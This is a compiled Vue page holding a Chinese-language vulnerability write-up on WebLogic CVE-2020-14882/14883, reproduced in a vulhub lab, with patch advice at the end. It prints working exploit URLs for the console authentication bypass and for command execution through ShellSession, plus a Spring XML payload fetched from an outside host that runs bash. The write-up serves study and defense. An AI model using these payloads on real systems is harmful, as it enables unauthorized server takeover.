import{_ as e}from"./plugin-vue_export-helper-x3n3nnut.js";import{r as t,o,c,a,b as n,d as l,e as p}from"./app-pej36io0.js";const i="/DailyNotes/assets/01-XDpZpehX.png",r="/DailyNotes/assets/02-X-ekM_57.png",u="/DailyNotes/assets/04-EHVUFyZ3.png",d="/DailyNotes/assets/03-7sdMEh9M.png",g="/DailyNotes/assets/06-aoC1k32X.png",m={},h=a("h1",{id:"漏洞名称-weblogic-管理控制台未授权远程命令执行漏洞",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞名称-weblogic-管理控制台未授权远程命令执行漏洞","aria-hidden":"true"},"#"),n(" 漏洞名称：Weblogic 管理控制台未授权远程命令执行漏洞")],-1),k=a("h2",{id:"漏洞介绍",tabindex:"-1"},[a("a",{class:"header-anchor",href:"#漏洞介绍","aria-hidden":"true"},"#"),n(" 漏洞介绍")],-1),b={href:"http://www.cnnvd.org.cn/index.html",target:"_blank",rel:"noopener noreferrer"},v=p(`<p>Weblogic是Oracle公司推出的J2EE应用服务器，Oracle WebLogic Server 多版本的Oracle Fusion Middleware 存在安全漏洞，该漏洞使未经身份验证的攻击者可以通过HTTP访问网络，从而破坏Oracle WebLogic Server。在2020年10月的更新中，Oracle官方修复了两个长亭科技安全研究员@voidfyoo 提交的安全漏洞，分别是CVE-2020-14882和CVE-2020-14883。</p><p>CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。</p><p>参考链接：</p><ul><li>https://www.oracle.com/security-alerts/cpuoct2020traditional.html</li><li>https://testbnull.medium.com/weblogic-rce-by-only-one-get-request-cve-2020-14882-analysis-6e4b09981dbf</li></ul><hr><h3 id="漏洞危害" tabindex="-1"><a class="header-anchor" href="#漏洞危害" aria-hidden="true">#</a> 漏洞危害</h3><p>远程代码执行漏洞 （CVE-2020-14882）POC 已被公开，未经身份验证的远程攻击者可通过构造特殊的 HTTP GET 请求，结合 CVE-2020-14883 漏洞进行利用，利用此漏洞可在未经身份验证的情况下直接接管 WebLogic Server Console ，并执行任意代码，利用门槛低，危害巨大。</p><hr><h3 id="影响范围" tabindex="-1"><a class="header-anchor" href="#影响范围" aria-hidden="true">#</a> 影响范围</h3><ul><li>weblogic 10.3.6.0.0</li><li>weblogic 12.1.3.0.0</li><li>weblogic 12.2.1.3.0</li><li>weblogic 12.2.1.4.0</li><li>weblogic 14.1.1.0.0</li></ul><hr><h2 id="漏洞利用" tabindex="-1"><a class="header-anchor" href="#漏洞利用" aria-hidden="true">#</a> 漏洞利用</h2><hr><h3 id="靶机环境" tabindex="-1"><a class="header-anchor" href="#靶机环境" aria-hidden="true">#</a> 靶机环境</h3><p>vulhub/weblogic/CVE-2020-14882</p><hr><h3 id="利用方法1" tabindex="-1"><a class="header-anchor" href="#利用方法1" aria-hidden="true">#</a> 利用方法1</h3><p><strong>探测确认</strong></p><p>使用 weblogicScanner(https://github.com/0xn0ne/weblogicScanner)探测是否存在该漏洞</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>python3 ws.py -v CVE-2020-14882 -t 192.168.1.189:7001
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+i+`" alt="01" tabindex="0" loading="lazy"><figcaption>01</figcaption></figure><p>首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+r+`" alt="02" tabindex="0" loading="lazy"><figcaption>02</figcaption></figure><p>成功登录到后台页面。</p><p>虽然利用漏洞CVE-2020-14882成功登录到后台页面，但当前用户是低权限用户，并不能执行命令。此时需要用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>，二是通过<code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>。</p><p>直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(&quot;java.lang.Runtime.getRuntime().exec(&#39;touch%20/tmp/success1&#39;);&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+u+`" alt="04" tabindex="0" loading="lazy"><figcaption>04</figcaption></figure><p>页面显示404，回到服务器端执行如下命令登录到容器里面</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>docker exec -i -t 容器id /bin/bash
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+d+`" alt="03" tabindex="0" loading="lazy"><figcaption>03</figcaption></figure><p>可以看到success1成功创建，命令执行成功。</p><p>这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在<code>com.tangosol.coherence.mvel2.sh.ShellSession</code>类。</p><h3 id="利用方法2" tabindex="-1"><a class="header-anchor" href="#利用方法2" aria-hidden="true">#</a> 利用方法2</h3><p><code>com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext</code>是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。</p><p>首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如<code>http://example.com/rce.xml</code>：</p><div class="language-xml line-numbers-mode" data-ext="xml"><pre class="language-xml"><code><span class="token prolog">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot; ?&gt;</span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>beans</span> <span class="token attr-name">xmlns</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans<span class="token punctuation">&quot;</span></span>
   <span class="token attr-name"><span class="token namespace">xmlns:</span>xsi</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.w3.org/2001/XMLSchema-instance<span class="token punctuation">&quot;</span></span>
   <span class="token attr-name"><span class="token namespace">xsi:</span>schemaLocation</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>pb<span class="token punctuation">&quot;</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>java.lang.ProcessBuilder<span class="token punctuation">&quot;</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">&quot;</span>start<span class="token punctuation">&quot;</span></span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>list</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>bash<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span>-c<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
            <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>value</span><span class="token punctuation">&gt;</span></span><span class="token cdata">&lt;![CDATA[touch /tmp/success2]]&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>value</span><span class="token punctuation">&gt;</span></span>
          <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>list</span><span class="token punctuation">&gt;</span></span>
        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>constructor-arg</span><span class="token punctuation">&gt;</span></span>
    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bean</span><span class="token punctuation">&gt;</span></span>
<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>beans</span><span class="token punctuation">&gt;</span></span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http://10.82.234.169:8000/rce.xml&quot;)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><figure><img src="`+g+'" alt="06" tabindex="0" loading="lazy"><figcaption>06</figcaption></figure><p>这个利用方法也有自己的缺点，就是需要Weblogic的服务器能够访问到恶意XML。</p><hr><h2 id="威胁防护建议" tabindex="-1"><a class="header-anchor" href="#威胁防护建议" aria-hidden="true">#</a> 威胁防护建议</h2><ol><li>Oracle官方最新漏洞修复补丁；</li><li>临时关闭后台/console/console.portal的对外访问</li></ol>',45);function x(f,w){const s=t("ExternalLinkIcon");return o(),c("div",null,[h,k,a("blockquote",null,[a("p",null,[a("a",b,[n("国家信息安全漏洞库 (cnnvd.org.cn)"),l(s)])])]),v])}const y=e(m,[["render",x],["__file","weblogic_CVE-2020-14882.html.vue"]]);export{y as default};
